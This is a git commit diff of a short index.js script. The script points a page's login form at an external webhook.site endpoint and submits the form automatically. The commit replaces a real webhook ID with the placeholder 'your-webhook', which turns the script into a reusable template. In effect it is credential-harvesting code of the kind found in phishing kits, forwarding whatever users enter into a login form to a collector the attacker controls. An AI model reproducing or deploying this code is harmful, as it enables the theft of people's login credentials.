05733e68cb1da4461ae2e721f9c4ec1bf5831297
Aikidooo <103935275+Aikidooo@users.noreply.github.com>
2022-12-12 15:06:40 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,5 +1,5 @@
 const form = document.getElementById("loginForm");
 
 
-form.action = "https://webhook.site/ad10ddc5-8bec-42e6-94e9-1465c0794f3e";
+form.action = "https://webhook.site/your-webhook";
 form.submit();
